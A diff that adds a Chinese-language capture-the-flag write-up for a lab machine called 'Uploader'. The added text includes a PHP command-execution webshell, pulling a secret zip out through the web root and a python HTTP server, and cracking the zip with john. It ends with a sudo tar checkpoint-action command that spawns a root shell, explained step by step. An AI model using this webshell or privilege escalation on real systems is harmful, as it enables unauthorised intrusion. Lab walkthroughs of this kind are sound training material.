@@ -1127,3 +1127,243 @@ root@Thehackerslabs-LavaShop:~# cat root.txt
 root@Thehackerslabs-LavaShop:~#
 ```
 
+## Uploader
+> **提示:** 靶机跳转传送门
+[Uploader](https://labs.thehackerslabs.com/machines/127)
+
+<img src="/assets/img/thehackerslabs-notes/Uploader.png" alt="LavaShop" style="zoom:50%;" />
+
+
+### 信息搜集
+
+```bash
+base) yolo@yolo:~$ nmap -sV -Pn 10.161.149.147
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 21:34 CST
+Nmap scan report for 10.161.149.147
+Host is up (0.76s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
+(base) yolo@yolo:~$ dirsearch -u http://10.161.149.147/
+/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/yolo/reports/http_10.161.149.147/__25-11-09_21-42-42.txt
+
+Target: http://10.161.149.147/
+
+[21:42:42] Starting:
+[21:42:43] 403 -  279B  - /.ht_wsr.txt
+[21:42:43] 403 -  279B  - /.htaccess.orig
+[21:42:43] 403 -  279B  - /.htaccess.bak1
+[21:42:43] 403 -  279B  - /.htaccess_sc
+[21:42:43] 403 -  279B  - /.htaccess.save
+[21:42:43] 403 -  279B  - /.htaccess.sample
+[21:42:43] 403 -  279B  - /.htaccessBAK
+[21:42:43] 403 -  279B  - /.htaccessOLD
+[21:42:43] 403 -  279B  - /.htaccess_orig
+[21:42:43] 403 -  279B  - /.htaccessOLD2
+[21:42:43] 403 -  279B  - /.htaccess_extra
+[21:42:43] 403 -  279B  - /.html
+[21:42:43] 403 -  279B  - /.htm
+[21:42:43] 403 -  279B  - /.htpasswd_test
+[21:42:43] 403 -  279B  - /.htpasswds
+[21:42:43] 403 -  279B  - /.httr-oauth
+[21:42:44] 403 -  279B  - /.php
+[21:43:02] 403 -  279B  - /server-status/
+[21:43:02] 403 -  279B  - /server-status
+[21:43:05] 200 -    1KB - /upload.php
+[21:43:06] 301 -  318B  - /uploads  ->  http://10.161.149.147/uploads/
+[21:43:06] 200 -  513B  - /uploads/
+
+Task Completed
+(base) yolo@yolo:~$
+```
+
+### get shell
+
+这道题真的ez，我随手上传了一个phpinfo，结果发现里面自带文件包含
+
+<img src="/assets/img/thehackerslabs-notes/image-20251109214515335.png" alt="image-20251109214515335" style="zoom:50%;" />
+
+那么直接写php一句话木马好了`<?php system($_GET['cmd']);?>`
+
+<img src="/assets/img/thehackerslabs-notes/image-20251109215246972.png" alt="image-20251109215246972" style="zoom:50%;" />
+
+接下来就弹下shell好了
+
+<img src="/assets/img/thehackerslabs-notes/image-20251109215900785.png" alt="image-20251109215900785" style="zoom:50%;" />
+
+接下来读取/home下的Readme.txt
+
+![image-20251109220319495](/assets/img/thehackerslabs-notes/image-20251109220319495.png)
+
+让我找到一个关键压缩包，那么就全局查找好了
+
+```bash
+www-data@TheHackersLabs-Operator:/srv/secret$ find / -name "*.zip" 2>/dev/null 
+/srv/secret/File.zip
+```
+
+接下来开点小灶吧，我通过php一句话木马连接的shell，一般是通过python起个web服务，把文件下载下来，不过这里还有个方法，就是把文件复制给web的uploads下面，可以直接下载
+
+```bash
+www-data@TheHackersLabs-Operator:/srv/secret$ find / -name "*.zip" 2>/dev/null 
+/srv/secret/File.zip
+<rator:/srv/secret$ cp /srv/secret/File.zip /var/www/html/uploads/           
+www-data@TheHackersLabs-Operator:/srv/secret$ cd /srv/secret/
+www-data@TheHackersLabs-Operator:/srv/secret$ python3 -m http.server 7777
+Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
+10.161.198.137 - - [09/Nov/2025 14:07:32] "GET /File.zip HTTP/1.1" 200 -
+```
+
+两个方法都在上面了
+
+怎么能这样呢，这个压缩包被加密了的
+
+```bash
+(base) yolo@yolo:~$ zip2john File.zip > ziphash
+ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
+(base) yolo@yolo:~$ john ziphash --wordlist=/snap/seclists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
+Will run 32 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+121288           (File.zip/Credentials/Credentials.txt)
+1g 0:00:00:00 DONE (2025-11-09 22:16) 3.704g/s 242725p/s 242725c/s 242725C/s 123456..ryanscott
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+真好，是个弱密码
+
+解压拿到用户密码
+
+```txt
+User: operatorx
+       
+Password: d0970714757783e6cf17b26fb8e2298f
+```
+
+尝试好几次，登不上去，感觉是md5，解密下出来
+
+>  怎么也是超级弱密码啊，我感觉能直接suForce爆破登录
+
+<img src="/assets/img/thehackerslabs-notes/image-20251109221909027.png" alt="image-20251109221909027" style="zoom:50%;" />
+
+### to root
+
+```bash
+operatorx@TheHackersLabs-Operator:~$ sudo -l
+Matching Defaults entries for operatorx on TheHackersLabs-Operator:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User operatorx may run the following commands on TheHackersLabs-Operator:
+    (ALL) NOPASSWD: /usr/bin/tar
+operatorx@TheHackersLabs-Operator:~$ sudo /usr/bin/tar -h
+/usr/bin/tar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options
+Try '/usr/bin/tar --help' or '/usr/bin/tar --usage' for more information.
+operatorx@TheHackersLabs-Operator:~$ sudo /usr/bin/tar --usage
+Usage: tar [-AcdrtuxGnSkUWOmpsMBiajJzZhPlRvwo?] [-g FILE] [-C DIR] [-T FILE]
+            [-X FILE] [-f ARCHIVE] [-F NAME] [-L NUMBER] [-b BLOCKS]
+            [-H FORMAT] [-V TEXT] [-I PROG] [-K MEMBER-NAME] [-N DATE-OR-FILE]
+            [--catenate] [--concatenate] [--create] [--delete] [--diff]
+            [--compare] [--append] [--test-label] [--list] [--update]
+            [--extract] [--get] [--check-device] [--listed-incremental=FILE]
+            [--incremental] [--hole-detection=TYPE] [--ignore-failed-read]
+            [--level=NUMBER] [--no-check-device] [--no-seek] [--seek]
+            [--occurrence[=NUMBER]] [--sparse-version=MAJOR[.MINOR]] [--sparse]
+            [--add-file=FILE] [--directory=DIR] [--exclude=PATTERN]
+            [--exclude-backups] [--exclude-caches] [--exclude-caches-all]
+            [--exclude-caches-under] [--exclude-ignore=FILE]
+            [--exclude-ignore-recursive=FILE] [--exclude-tag=FILE]
+            [--exclude-tag-all=FILE] [--exclude-tag-under=FILE] [--exclude-vcs]
+            [--exclude-vcs-ignores] [--no-null] [--no-recursion] [--no-unquote]
+            [--no-verbatim-files-from] [--null] [--recursion]
+            [--files-from=FILE] [--unquote] [--verbatim-files-from]
+            [--exclude-from=FILE] [--anchored] [--ignore-case] [--no-anchored]
+            [--no-ignore-case] [--no-wildcards] [--no-wildcards-match-slash]
+            [--wildcards] [--wildcards-match-slash] [--keep-directory-symlink]
+            [--keep-newer-files] [--keep-old-files] [--no-overwrite-dir]
+            [--one-top-level[=DIR]] [--overwrite] [--overwrite-dir]
+            [--recursive-unlink] [--remove-files] [--skip-old-files]
+            [--unlink-first] [--verify] [--ignore-command-error]
+            [--no-ignore-command-error] [--to-stdout] [--to-command=COMMAND]
+            [--atime-preserve[=METHOD]] [--clamp-mtime]
+            [--delay-directory-restore] [--group=NAME] [--group-map=FILE]
+            [--mode=CHANGES] [--mtime=DATE-OR-FILE] [--touch]
+            [--no-delay-directory-restore] [--no-same-owner]
+            [--no-same-permissions] [--numeric-owner] [--owner=NAME]
+            [--owner-map=FILE] [--preserve-permissions] [--same-permissions]
+            [--same-owner] [--sort=ORDER] [--preserve-order] [--same-order]
+            [--acls] [--no-acls] [--no-selinux] [--no-xattrs] [--selinux]
+            [--xattrs] [--xattrs-exclude=MASK] [--xattrs-include=MASK]
+            [--force-local] [--file=ARCHIVE] [--info-script=NAME]
+            [--new-volume-script=NAME] [--tape-length=NUMBER] [--multi-volume]
+            [--rmt-command=COMMAND] [--rsh-command=COMMAND] [--volno-file=FILE]
+            [--blocking-factor=BLOCKS] [--read-full-records] [--ignore-zeros]
+            [--record-size=NUMBER] [--format=FORMAT] [--  gnu] [--  oldgnu] [--
+             pax] [--  posix] [--  ustar] [--  v7] [--old-archive]
+            [--portability]
+            [--pax-option=keyword[[:]=value][,keyword[[:]=value]]...] [--posix]
+            [--label=TEXT] [--auto-compress] [--use-compress-program=PROG]
+            [--bzip2] [--xz] [--lzip] [--lzma] [--lzop] [--no-auto-compress]
+            [--zstd] [--gzip] [--gunzip] [--ungzip] [--compress] [--uncompress]
+            [--backup[=CONTROL]] [--hard-dereference] [--dereference]
+            [--starting-file=MEMBER-NAME] [--newer-mtime=DATE]
+            [--newer=DATE-OR-FILE] [--after-date=DATE-OR-FILE]
+            [--one-file-system] [--absolute-names] [--suffix=STRING]
+            [--strip-components=NUMBER] [--transform=EXPRESSION]
+            [--xform=EXPRESSION] [--checkpoint[=NUMBER]]
+            [--checkpoint-action=ACTION] [--full-time] [--index-file=FILE]
+            [--check-links] [--no-quote-chars=STRING] [--quote-chars=STRING]
+            [--quoting-style=STYLE] [--block-number] [--show-defaults]
+            [--show-omitted-dirs] [--show-snapshot-field-ranges]
+            [--show-transformed-names] [--show-stored-names]
+            [--totals[=SIGNAL]] [--utc] [--verbose] [--warning=KEYWORD]
+            [--interactive] [--confirmation] [--help] [--restrict] [--usage]
+            [--version] [FILE]...
+
+```
+
+发现这里有个sudo无密码执行tar
+
+直接来这里查https://gtfobins.github.io/gtfobins/tar/
+
+成功拿到root的shell
+
+```bash
+sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+```
+
+接下来使用`/usr/bin/script -qc /bin/bash /dev/null`将shell维持一下，然后就over了
+
+<img src="/assets/img/thehackerslabs-notes/image-20251109223017224.png" alt="image-20251109223017224" style="zoom: 80%;" />
+
+对了，我们解析下最后提权的payload
+
+### payload各部分解析：
+
+1. **`sudo`** - 以root权限执行命令
+2. **`/usr/bin/tar`** - tar命令的完整路径
+3. **`-cf /dev/null /dev/null`**
+   - `-c` = 创建归档文件
+   - `-f /dev/null` = 输出到/dev/null（空设备，丢弃输出）
+   - `/dev/null` = 要归档的文件（实际上不需要真实文件）
+4. **`--checkpoint=1`**
+   - 设置检查点间隔为1个记录
+   - 每处理1个文件就触发一次检查点
+5. **`--checkpoint-action=exec=/bin/sh`**
+   - **关键部分**：在检查点触发时执行 `/bin/sh`
+   - 由于以root权限运行，所以启动的是root shell
